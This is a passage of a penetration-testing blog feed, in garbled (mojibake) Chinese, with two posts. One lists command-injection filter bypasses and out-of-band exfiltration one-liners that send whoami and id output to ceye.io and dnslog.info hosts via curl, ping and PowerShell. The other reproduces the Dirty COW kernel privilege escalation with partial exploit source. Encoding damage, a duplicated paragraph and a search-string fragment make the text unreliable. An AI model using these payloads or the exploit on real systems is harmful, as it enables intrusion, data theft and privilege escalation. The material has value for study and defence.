<h1 id="0x06-å‘½ä»¤æ‰§è¡Œç»•è¿‡"><a href="#0x06-å‘½ä»¤æ‰§è¡Œç»•è¿‡" class="headerlink" title="0x06 å‘½ä»¤æ‰§è¡Œç»•è¿‡"></a>0x06 å‘½ä»¤æ‰§è¡Œç»•è¿‡</h1><p>æŠ€å·§æ¥æºï¼šl3m0n</p>
<ol>
<li>escapeshellcmdï¼š<code>escapeshellcmd()</code>å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shellå‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ°<code>exec()</code>æˆ–<code>system()</code>å‡½æ•°ï¼Œæˆ–è€…æ‰§è¡Œæ“ä½œç¬¦ä¹‹å‰è¿›è¡Œè½¬ä¹‰ä¸º<code>^</code>,åˆ©ç”¨<code>%1a</code>ï¼Œå¯ä»¥ç»•è¿‡è¿‡æ»¤æ‰§è¡Œå‘½ä»¤ã€‚</li>
<li><p>é»‘åå•ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">æ‰§è¡Œlså‘½ä»¤ï¼š</div><div class="line">a=l;b=s;$a$b</div><div class="line">cat helloæ–‡ä»¶å†…å®¹ï¼š</div><div class="line">a=c;b=at;c=he;d=llo;$a$b $&amp;#123;c&amp;#125;$&amp;#123;d&amp;#125;</div></pre></td></tr></table></figure>
</li>
<li><p>ç©ºæ ¼ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ç»•è¿‡ç©ºæ ¼</div><div class="line">$&amp;#123;IFS&amp;#125;</div><div class="line">cat$&amp;#123;IFS&amp;#125;hello</div><div class="line">æˆ–è€…åœ¨è¯»å–æ–‡ä»¶çš„æ—¶å€™åˆ©ç”¨é‡å®šå‘ç¬¦</div><div class="line">&lt;&gt;</div><div class="line">cat&lt;&gt;hello</div></pre></td></tr></table></figure>
</li>
<li><p>æ— å›æ˜¾<br>æ— å›æ˜¾è·å–æ•°æ®çš„éœ€æ±‚è¿˜æ˜¯æŒºå¤§çš„ï¼Œæ¯”å¦‚sqlï¼Œxxeï¼Œxssç­‰ç­‰ï¼Œè¿™ä¸ªæ—¶å€™ä¸€èˆ¬å¯ä»¥ç”¨dns/httpé€šé“æ¥è·å–æ•°æ®ã€‚<br><strong>linuxï¼š</strong></p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">curl xxxx.ceye.io/`whoami`</div><div class="line">ping -c 1 `whoami`.xxxx.ceye.io</div><div class="line">ç‰¹æ®Šå­—ç¬¦æˆ–è€…æ˜¯ç©ºæ ¼å‡ºç°çš„è¯ï¼Œè¿™æ—¶å€™å¯ä»¥é€šè¿‡ä¸€äº›ç¼–ç æ¥ï¼Œæ¯”å¦‚base64</div><div class="line">curl http://xxxx.ceye.io/$(id|base64)</div></pre></td></tr></table></figure>
<p><strong>windows:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">httpè¯·æ±‚ï¼š</div><div class="line">for /F %x in (&apos;whoami&apos;) do start http://xxx.ceye.io/%x</div><div class="line">dnsè¯·æ±‚ï¼š</div><div class="line">è·å–è®¡ç®—æœºåï¼šfor /F &quot;delims=\&quot; %i in (&apos;whoami&apos;) do ping -n 1 %i.xxx.dnslog.info</div><div class="line">è·å–ç”¨æˆ·åï¼šfor /F &quot;delims=\ tokens=2&quot; %i in (&apos;whoami&apos;) do ping -n 1 %i.xxx.dnslog.info</div><div class="line">ç”¨powershellæ¥base64æ•°æ®</div><div class="line">for /F %x in (&apos;whoami&apos;) do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(&apos;%x&apos;));$b=New-Object System.Net.WebClient;$b.DownloadString(&apos;http://xxx.ceye.io/&apos;+$a);</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> PHP </tag>
            
            <tag> webshell </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
            <tag> linux </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[â€œè„ç‰›â€æ¼æ´æµ…æä¸å¤ç°]]></title>
      <url>/2016/11/02/%E2%80%9C%E8%84%8F%E7%89%9B%E2%80%9C%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      <content type="html"><![CDATA[<h1 id="0x00-æ¼æ´æ¦‚è¿°"><a href="#0x00-æ¼æ´æ¦‚è¿°" class="headerlink" title="0x00 æ¼æ´æ¦‚è¿°"></a>0x00 æ¼æ´æ¦‚è¿°</h1><p>Linuxå†…æ ¸çš„å†…å­˜å­ç³»ç»Ÿåœ¨å¤„ç†å†™æ—¶æ‹·è´ï¼ˆCopy-on-Wirteï¼‰æ—¶å­˜åœ¨æ¡ä»¶ç«äº‰æ¼æ´ï¼Œå¯¼è‡´å¯ä»¥ç ´åç§æœ‰åªè¯»å†…å­˜æ˜ å°„ã€‚ä¸€ä¸ªä½æƒé™çš„æœ¬åœ°ç”¨æˆ·èƒ½å¤Ÿåˆ©ç”¨æ­¤æ¼æ´è·å–å…¶ä»–åªè¯»å†…å­˜æ˜ å°„çš„å†™æƒé™ï¼Œæœ‰å¯èƒ½è¿›ä¸€æ­¥å¯¼è‡´ææƒæ¼æ´<br><a id="more"></a><br><strong>æ¼æ´ç¼–å·ï¼š</strong>CVE-2016-5195</p>
<p><strong>æ¼æ´ç±»å‹ï¼š</strong>å†…æ ¸ç«æ€æ¡ä»¶æ¼æ´</p>
<p><strong>æ¼æ´å±å®³ï¼š</strong>ä½æƒé™ç”¨æˆ·åˆ©ç”¨è¯¥æ¼æ´æŠ€æœ¯å¯ä»¥åœ¨å…¨ç‰ˆæœ¬Liuxç³»ç»Ÿä¸Šå®ç°æœ¬åœ°ææƒ</p>
<p><strong>å½±å“èŒƒå›´ï¼š</strong>Linuxå†…æ ¸&gt;=2.6.22(07å¹´ä»¥åçš„)</p>
<h1 id="0x01-æ¼æ´åˆ©ç”¨"><a href="#0x01-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x01 æ¼æ´åˆ©ç”¨"></a>0x01 æ¼æ´åˆ©ç”¨</h1><p><a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c" target="_blank" rel="external">POCåœ°å€</a></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/cow1.png" alt=""></p>
<p>åªè¦Linuxå†…æ ¸&gt;=2.6.22å³å¯</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/cow3.png" alt=""></p>
<p><code>gcc</code>å‘½ä»¤æ˜¯ä¸€ä¸ªç¼–è¯‘å™¨å¥—ä»¶ï¼Œå¯ç”¨äºç¼–è¯‘å¤šç§è¯­è¨€æºç .</p>
<p>ç¼–è¯‘é€‰é¡¹ä¸­æŒ‡å®š<code>-pthread</code> ä¼šé™„åŠ ä¸€ä¸ªå®å®šä¹‰ <code>-D_REENTRANT</code>è¯¥å®ä¼šå¯¼è‡´ <code>libc</code> å¤´æ–‡ä»¶é€‰æ‹©é‚£äº›<code>thread-safe</code>çš„å®ç°ã€‚<code>-o</code>å‚æ•°ä¸ºç¼–è¯‘åè¾“å‡ºæ–‡ä»¶åã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/cow4.png" alt=""></p>
<p>æ‰§è¡Œå‘½ä»¤è¿›è¡Œå°†Dirty_COWå­—ç¬¦ä¸²ä¿å­˜åˆ°<code>readfile</code>æ–‡ä»¶å†…(å†™å…¥æ–‡ä»¶åå’Œå†…å®¹å¯è‡ªå®šä¹‰ï¼Œä½†æ˜¯å¦‚æœè¯¥æ–‡ä»¶å†…å®¹ä¸ºç©ºï¼Œä¼šå¯¼è‡´POCæµ‹è¯•<strong><code>å¤±è´¥</code></strong>)</p>
<p><code>0404</code>ä»£è¡¨æ‰€æœ‰ç”¨æˆ·é»˜è®¤æƒ…å†µä¸‹å¯¹è¯¥æ–‡ä»¶åªæœ‰è¯»å–æƒé™ï¼Œæ— æ³•ä¿®æ”¹åˆ é™¤</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/cow5.png" alt=""></p>
<p>é€šè¿‡<code>./</code>æ–‡ä»¶å æ–¹å¼æ˜¯æ‰§è¡Œè¯¥æ–‡ä»¶å‘½ä»¤ åé¢ä¸€èˆ¬é™„åŠ ç©ºæ ¼å‚æ•°ã€‚</p>
<p>æ‰§è¡Œdirtyc0wæ–‡ä»¶  <code>readfile</code> æ˜¯æ–‡ä»¶åå‚æ•° <code>m00000...</code>ä¸ºåˆ©ç”¨æ¼æ´å†™å…¥çš„å€¼.</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/cow6.png" alt=""></p>
<p>å‘ç°è¯¥æ–‡ä»¶å·²è¢«è¾“å…¥çš„å­—ç¬¦ä¸²<code>m0000...</code>è¦†ç›–</p>
<h1 id="0x02-æ¼æ´å½¢æˆåŸå› "><a href="#0x02-æ¼æ´å½¢æˆåŸå› " class="headerlink" title="0x02 æ¼æ´å½¢æˆåŸå› "></a>0x02 æ¼æ´å½¢æˆåŸå› </h1><p><strong>Linuxå†™æ—¶æ‹·è´æŠ€æœ¯(copy-on-write)</strong></p>
<p>åœ¨Linuxç¨‹åºä¸­ï¼Œforkï¼ˆï¼‰ä¼šäº§ç”Ÿä¸€ä¸ªå’Œçˆ¶è¿›ç¨‹å®Œå…¨ç›¸åŒçš„å­è¿›ç¨‹ï¼Œä½†å­è¿›ç¨‹åœ¨æ­¤åå¤šä¼šexecç³»ç»Ÿè°ƒç”¨ï¼Œå‡ºäºæ•ˆç‡è€ƒè™‘ï¼Œlinuxä¸­å¼•å…¥äº†â€œå†™æ—¶å¤åˆ¶â€œæŠ€æœ¯ï¼Œä¹Ÿå°±æ˜¯åªæœ‰è¿›ç¨‹ç©ºé—´çš„å„æ®µçš„å†…å®¹è¦å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ‰ä¼šå°†çˆ¶è¿›ç¨‹çš„å†…å®¹å¤åˆ¶ä¸€ä»½ç»™å­è¿›ç¨‹ã€‚</p>
<p> <strong>ç«æ€æ¡ä»¶</strong></p>
<p>ç«æ€æ¡ä»¶ï¼ˆrace conditionï¼‰æ˜¯æŒ‡è®¾å¤‡æˆ–ç³»ç»Ÿå‡ºç°ä¸æ°å½“çš„æ‰§è¡Œæ—¶åºï¼Œè€Œå¾—åˆ°ä¸æ­£ç¡®çš„ç»“æœã€‚</p>
<p>inuxå†…å­˜ç®¡ç†â€“ç¼ºé¡µå¼‚å¸¸å¤„ç†</p>
<p>è§¦å‘å¼‚å¸¸çš„çº¿æ€§åœ°å€å¤„äºç”¨æˆ·ç©ºé—´çš„vmaä¸­ï¼Œä½†è¿˜æœªåˆ†é…ç‰©ç†é¡µï¼Œå¦‚æœè®¿é—®æƒé™OKçš„è¯å†…æ ¸å°±ç»™è¿›ç¨‹åˆ†é…ç›¸åº”çš„ç‰©ç†é¡µã€‚</p>
<p>è§¦å‘å¼‚å¸¸çš„çº¿æ€§åœ°å€ä¸å¤„äºç”¨æˆ·ç©ºé—´çš„vmaä¸­ï¼Œè¿™ç§æƒ…å†µå¾—åˆ¤æ–­æ˜¯ä¸æ˜¯å› ä¸ºç”¨æˆ·è¿›ç¨‹çš„æ ˆç©ºé—´æ¶ˆè€—å®Œè€Œè§¦å‘çš„ç¼ºé¡µå¼‚å¸¸ã€‚</p>
<p>å¦‚æœ æ˜¯çš„è¯åˆ™åœ¨ç”¨æˆ·ç©ºé—´å¯¹æ ˆåŒºåŸŸè¿›è¡Œæ‰©å±•ï¼Œå¹¶ä¸”åˆ†é…ç›¸åº”çš„ç‰©ç†é¡µï¼Œå¦‚æœä¸æ˜¯åˆ™ä½œä¸ºä¸€æ¬¡éæ³•åœ°å€è®¿é—®æ¥å¤„ç†ï¼Œå†…æ ¸å°†ç»ˆç»“è¿›ç¨‹</p>
<p><strong>ç¼ºé¡µä¸­æ–­ </strong></p>
<p>ç¼ºé¡µä¸­æ–­å°±æ˜¯è¦è®¿é—®çš„é¡µä¸åœ¨ä¸»å­˜ï¼Œéœ€è¦æ“ä½œç³»ç»Ÿå°†å…¶è°ƒå…¥ä¸»å­˜åå†è¿›è¡Œè®¿é—®ã€‚åœ¨è¿™ä¸ªæ—¶å€™ï¼Œè¢«å†…å­˜æ˜ å°„çš„æ–‡ä»¶å®é™…ä¸Šæˆäº†ä¸€ä¸ªåˆ†é¡µäº¤æ¢æ–‡ä»¶ã€‚</p>
<h1 id="0x03-è§¦å‘åŸç†ï¼š"><a href="#0x03-è§¦å‘åŸç†ï¼š" class="headerlink" title="0x03 è§¦å‘åŸç†ï¼š"></a>0x03 è§¦å‘åŸç†ï¼š</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">void *madviseThread(void *arg)</div><div class="line">&#123;</div><div class="line">  char *str;</div><div class="line">  str=(char*)arg;</div><div class="line">  int i,c=0;</div><div class="line">  for(i=0;i&lt;100000000;i++)</div><div class="line">  &#123;</div><div class="line">/*</div><div class="line">You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661</div><div class="line">&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call</div><div class="line">&gt; while having the page of the executable mmapped in memory.</div><div class="line">*/</div><div class="line">    c+=madvise(map,100,MADV_DONTNEED);</div><div class="line">  &#125;</div><div class="line">  printf(&quot;madvise %d\n\n&quot;,c);</div><div class="line">&#125;</div><div class="line"> </div><div class="line">void *procselfmemThread(void *arg)</div><div class="line">&#123;</div><div class="line">  char *str;</div><div class="line">  str=(char*)arg;</div><div class="line">/*</div><div class="line">You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16</div><div class="line">&gt;  The in the wild exploit we are aware of doesn&apos;t work on Red Hat</div><div class="line">&gt;  Enterprise Linux 5 and 6 out of the box because on one side of</div><div class="line">&gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not</div><div class="line">&gt;  writable on Red Hat Enterprise Linux 5 and 6.</div><div class="line">*/</div><div class="line">  int f=open(&quot;/proc/self/mem&quot;,O_RDWR);</div><div class="line">  int i,c=0;</div><div class="line">  for(i=0;i&lt;100000000;i++) &#123;</div><div class="line">/*</div><div class="line">You have to reset the file pointer to the memory position.</div><div class="line">*/</div><div class="line">    lseek(f,(uintptr_t) map,SEEK_SET);</div><div class="line">    c+=write(f,str,strlen(str));</div><div class="line">  &#125;</div><div class="line">  printf(&quot;procselfmem %d\n\n&quot;, c);</div><div class="line">&#125;</div><div class="line"> </div><div class="line"> </div><div class="line">int main(int argc,char *argv[])</div><div class="line">&#123;</div><div class="line">/*</div><div class="line">You have to pass two arguments. File and Contents.</div><div class="line">*/</div><div class="line">  if (argc&lt;3) &#123;</div><div class="line">  (void)fprintf(stderr, &quot;%s\n&quot;,</div><div class="line">      &quot;usage: dirtyc0w target_file new_content&quot;);</div><div class="line">  return 1; &#125;</div><div class="line">  pthread_t pth1,pth2;</div><div class="line">/*</div><div class="line">You have to open the file in read only mode.</div><div class="line">*/</div><div class="line">  f=open(argv[1],O_RDONLY);</div><div class="line">  fstat(f,&amp;st);</div><div class="line">  name=argv[1];</div></pre></td></tr></table></figure>
<p>è°ƒç”¨writeç³»ç»Ÿè°ƒç”¨å‘/proc/self/memæ–‡ä»¶ä¸­å†™å…¥æ•°æ®æ—¶ï¼Œè¿›å…¥å†…æ ¸æ€åå†…æ ¸ä¼šè°ƒç”¨get_user_pageså‡½æ•°è·å–è¦å†™å…¥å†…å­˜åœ°å€ã€‚get_user_pagesä¼šè°ƒç”¨follow_page_maskæ¥è·å–è¿™å—å†…å­˜çš„é¡µè¡¨é¡¹ï¼Œå¹¶åŒæ—¶è¦æ±‚é¡µè¡¨é¡¹æ‰€æŒ‡å‘çš„å†…å­˜æ˜ å°„å…·æœ‰å¯å†™çš„æƒé™ã€‚</p>
<p>ç¬¬ä¸€æ¬¡è·å–å†…å­˜çš„é¡µè¡¨é¡¹ä¼šå› ä¸ºç¼ºé¡µè€Œå¤±è´¥ã€‚get_user_pageè°ƒç”¨faultin_pageè¿›è¡Œç¼ºé¡µå¤„ç†åç¬¬äºŒæ¬¡è°ƒç”¨follow_page_maskè·å–è¿™å—å†…å­˜çš„é¡µè¡¨é¡¹ï¼Œå¦‚æœéœ€è¦è·å–çš„é¡µè¡¨é¡¹æŒ‡å‘çš„æ˜¯ä¸€ä¸ªåªè¯»çš„æ˜ å°„ï¼Œé‚£ç¬¬äºŒæ¬¡è·å–ä¹Ÿä¼šå¤±è´¥ã€‚è¿™æ—¶å€™get_user_pageså‡½æ•°ä¼šç¬¬ä¸‰æ¬¡è°ƒç”¨follow_page_maskæ¥è·å–è¯¥å†…å­˜çš„é¡µè¡¨é¡¹ï¼Œå¹¶ä¸”ä¸å†è¦æ±‚é¡µè¡¨é¡¹æ‰€æŒ‡å‘çš„å†…å­˜æ˜ å°„å…·æœ‰å¯å†™çš„æƒé™ï¼Œè¿™æ—¶æ˜¯å¯ä»¥æˆåŠŸè·å–çš„ï¼Œè·å–æˆåŠŸåå†…æ ¸ä¼šå¯¹è¿™ä¸ªåªè¯»çš„å†…å­˜è¿›è¡Œå¼ºåˆ¶çš„å†™å…¥æ“ä½œã€‚è¿™ä¸ªå®ç°æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºæœ¬æ¥å†™å…¥/proc/self/memå°±æ˜¯ä¸€ä¸ªæ— è§†æ˜ å°„æƒé™çš„å¼ºè¡Œå†™å…¥ï¼Œå°±ç®—æ˜¯æ–‡ä»¶æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ä¸­ï¼Œä¹Ÿä¸ä¼šå‡ºç°è¶Šæƒå†™ï¼šå¦‚æœå†™å…¥çš„è™šæ‹Ÿå†…å­˜æ˜¯ä¸€ä¸ªVM_PRIVATEçš„æ˜ å°„ï¼Œé‚£åœ¨ç¼ºé¡µçš„æ—¶å€™å†…æ ¸å°±ä¼šæ‰§è¡ŒCOWæ“ä½œäº§ç”Ÿä¸€ä¸ªå‰¯æœ¬æ¥è¿›è¡Œå†™å…¥ï¼Œå†™å…¥çš„å†…å®¹æ˜¯ä¸ä¼šåŒæ­¥åˆ°æ–‡ä»¶ä¸­çš„,å¦‚æœå†™å…¥çš„è™šæ‹Ÿå†…å­˜æ˜¯ä¸€ä¸ªVM_SHAREçš„æ˜ å°„ï¼Œé‚£mmapèƒ½å¤Ÿæ˜ å°„æˆåŠŸçš„å……è¦æ¡ä»¶å°±æ˜¯è¿›ç¨‹æ‹¥æœ‰å¯¹è¯¥æ–‡ä»¶çš„å†™æƒé™ï¼Œè¿™æ ·å†™å…¥çš„å†…å®¹åŒæ­¥åˆ°æ–‡ä»¶ä¸­ä¹Ÿä¸ç®—è¶Šæƒäº†ã€‚&amp;oq=è°ƒç”¨writeç³»ç»Ÿè°ƒç”¨å‘/proc/self/memæ–‡ä»¶ä¸­å†™å…¥æ•°æ®æ—¶ï¼Œè¿›å…¥å†…æ ¸æ€åå†…æ ¸ä¼šè°ƒç”¨get_user_pageså‡½æ•°è·å–è¦å†™å…¥å†…å­˜åœ°å€ã€‚get_user_pagesä¼šè°ƒç”¨follow_page_maskæ¥è·å–è¿™å—å†…å­˜çš„é¡µè¡¨é¡¹ï¼Œå¹¶åŒæ—¶è¦æ±‚é¡µè¡¨é¡¹æ‰€æŒ‡å‘çš„å†…å­˜æ˜ å°„å…·æœ‰å¯å†™çš„æƒé™ã€‚ç¬¬ä¸€æ¬¡è·å–å†…å­˜çš„é¡µè¡¨é¡¹ä¼šå› ä¸ºç¼ºé¡µè€Œå¤±è´¥ã€‚get_user_pageè°ƒç”¨faultin_pageè¿›è¡Œç¼ºé¡µå¤„ç†åç¬¬äºŒæ¬¡è°ƒç”¨follow_page_maskè·å–è¿™å—å†…å­˜çš„é¡µè¡¨é¡¹ï¼Œå¦‚æœéœ€è¦è·å–çš„é¡µè¡¨é¡¹æŒ‡å‘çš„æ˜¯ä¸€ä¸ªåªè¯»çš„æ˜ å°„ï¼Œé‚£ç¬¬äºŒæ¬¡è·å–ä¹Ÿä¼šå¤±è´¥ã€‚è¿™æ—¶å€™get_user_pageså‡½æ•°ä¼šç¬¬ä¸‰æ¬¡è°ƒç”¨follow_page_maskæ¥è·å–è¯¥å†…å­˜çš„é¡µè¡¨é¡¹ï¼Œå¹¶ä¸”ä¸å†è¦æ±‚é¡µè¡¨é¡¹æ‰€æŒ‡å‘çš„å†…å­˜æ˜ å°„å…·æœ‰å¯å†™çš„æƒé™ï¼Œè¿™æ—¶æ˜¯å¯ä»¥æˆåŠŸè·å–çš„ï¼Œè·å–æˆåŠŸåå†…æ ¸ä¼šå¯¹è¿™ä¸ªåªè¯»çš„å†…å­˜è¿›è¡Œå¼ºåˆ¶çš„å†™å…¥æ“ä½œã€‚è¿™ä¸ªå®ç°æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºæœ¬æ¥å†™å…¥/proc/self/memå°±æ˜¯ä¸€ä¸ªæ— è§†æ˜ å°„æƒé™çš„å¼ºè¡Œå†™å…¥ï¼Œå°±ç®—æ˜¯æ–‡ä»¶æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ä¸­ï¼Œä¹Ÿä¸ä¼šå‡ºç°è¶Šæƒå†™ï¼šå¦‚æœå†™å…¥çš„è™šæ‹Ÿå†…å­˜æ˜¯ä¸€ä¸ªVM_PRIVATEçš„æ˜ å°„ï¼Œé‚£åœ¨ç¼ºé¡µçš„æ—¶å€™å†…æ ¸å°±ä¼šæ‰§è¡ŒCOWæ“ä½œäº§ç”Ÿä¸€ä¸ªå‰¯æœ¬æ¥è¿›è¡Œå†™å…¥ï¼Œå†™å…¥çš„å†…å®¹æ˜¯ä¸ä¼šåŒæ­¥åˆ°æ–‡ä»¶ä¸­çš„.å¦‚æœå†™å…¥çš„è™šæ‹Ÿå†…å­˜æ˜¯ä¸€ä¸ªVM_SHAREçš„æ˜ å°„ï¼Œé‚£mmapèƒ½å¤Ÿæ˜ å°„æˆåŠŸçš„å……è¦æ¡ä»¶å°±æ˜¯è¿›ç¨‹æ‹¥æœ‰å¯¹è¯¥æ–‡ä»¶çš„å†™æƒé™ï¼Œè¿™æ ·å†™å…¥çš„å†…å®¹åŒæ­¥åˆ°æ–‡ä»¶ä¸­ä¹Ÿä¸ç®—è¶Šæƒäº†ã€‚</p>
<p>ä½†æ˜¯ï¼Œåœ¨ä¸Šè¿°æµç¨‹ä¸­ï¼Œå¦‚æœç¬¬äºŒæ¬¡è·å–é¡µè¡¨é¡¹å¤±è´¥ä¹‹åï¼Œå¦ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨madvice(addr,addrlen,MADV_DONTNEED),å…¶ä¸­addr~addrlenæ˜¯ä¸€ä¸ªåªè¯»æ–‡ä»¶çš„VM_PRIVATEçš„åªè¯»å†…å­˜æ˜ å°„ï¼Œé‚£è¯¥æ˜ å°„çš„é¡µè¡¨é¡¹ä¼šè¢«ç½®ç©ºã€‚è¿™æ—¶å¦‚æœget_user_pageså‡½æ•°ç¬¬ä¸‰æ¬¡è°ƒç”¨follow_page_maskæ¥è·å–è¯¥å†…å­˜çš„é¡µè¡¨é¡¹ã€‚ç”±äºè¿™æ¬¡è°ƒç”¨ä¸å†è¦æ±‚è¯¥å†…å­˜æ˜ å°„å…·æœ‰å†™æƒé™ï¼Œæ‰€ä»¥åœ¨ç¼ºé¡µå¤„ç†çš„æ—¶å€™å†…æ ¸ä¹Ÿä¸å†ä¼šæ‰§è¡ŒCOWæ“ä½œäº§ç”Ÿä¸€ä¸ªå‰¯æœ¬ä»¥ä¾›å†™å…¥ã€‚æ‰€ä»¥ç¼ºé¡µå¤„ç†å®Œæˆååç¬¬å››æ¬¡è°ƒç”¨follow_page_maskè·å–è¿™å—å†…å­˜çš„é¡µè¡¨é¡¹çš„æ—¶å€™ï¼Œä¸ä»…å¯ä»¥æˆåŠŸè·å–ï¼Œè€Œä¸”è·å–ä¹‹åå¼ºåˆ¶çš„å†™å…¥çš„å†…å®¹ä¹Ÿä¼šåŒæ­¥åˆ°æ˜ å°„çš„åªè¯»æ–‡ä»¶ä¸­ã€‚ä»è€Œå¯¼è‡´äº†åªè¯»æ–‡ä»¶çš„è¶Šæƒå†™ã€‚ä½†æ˜¯ï¼Œåœ¨ä¸Šè¿°æµç¨‹ä¸­ï¼Œå¦‚æœç¬¬äºŒæ¬¡è·å–é¡µè¡¨é¡¹å¤±è´¥ä¹‹åï¼Œå¦ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨madvice(addr,addrlen,MADV_DONTNEED),å…¶ä¸­addr~addrlenæ˜¯ä¸€ä¸ªåªè¯»æ–‡ä»¶çš„VM_PRIVATEçš„åªè¯»å†…å­˜æ˜ å°„ï¼Œé‚£è¯¥æ˜ å°„çš„é¡µè¡¨é¡¹ä¼šè¢«ç½®ç©ºã€‚è¿™æ—¶å¦‚æœget_user_pageså‡½æ•°ç¬¬ä¸‰æ¬¡è°ƒç”¨follow_page_maskæ¥è·å–è¯¥å†…å­˜çš„é¡µè¡¨é¡¹ã€‚ç”±äºè¿™æ¬¡è°ƒç”¨ä¸å†è¦æ±‚è¯¥å†…å­˜æ˜ å°„å…·æœ‰å†™æƒé™ï¼Œæ‰€ä»¥åœ¨ç¼ºé¡µå¤„ç†çš„æ—¶å€™å†…æ ¸ä¹Ÿä¸å†ä¼šæ‰§è¡ŒCOWæ“ä½œäº§ç”Ÿä¸€ä¸ªå‰¯æœ¬ä»¥ä¾›å†™å…¥ã€‚æ‰€ä»¥ç¼ºé¡µå¤„ç†å®Œæˆååç¬¬å››æ¬¡è°ƒç”¨follow_page_maskè·å–è¿™å—å†…å­˜çš„é¡µè¡¨é¡¹çš„æ—¶å€™ï¼Œä¸ä»…å¯ä»¥æˆåŠŸè·å–ï¼Œè€Œä¸”è·å–ä¹‹åå¼ºåˆ¶çš„å†™å…¥çš„å†…å®¹ä¹Ÿä¼šåŒæ­¥åˆ°æ˜ å°„çš„åªè¯»æ–‡ä»¶ä¸­ã€‚ä»è€Œå¯¼è‡´äº†åªè¯»æ–‡ä»¶çš„è¶Šæƒå†™ã€‚</p>
<h1 id="0x04-ä¿®å¤å»ºè®®"><a href="#0x04-ä¿®å¤å»ºè®®" class="headerlink" title="0x04 ä¿®å¤å»ºè®®"></a>0x04 ä¿®å¤å»ºè®®</h1><p>å‡çº§å¯¹åº”ç‰ˆæœ¬.</p>
]]></content>
      
        
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> ææƒ </tag>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pythonå®ç°12306è½¦ç¥¨æŸ¥è¯¢]]></title>
      <url>/2016/10/10/Python%E5%AE%9E%E7%8E%B012306%E8%BD%A6%E7%A5%A8%E6%9F%A5%E8%AF%A2/</url>
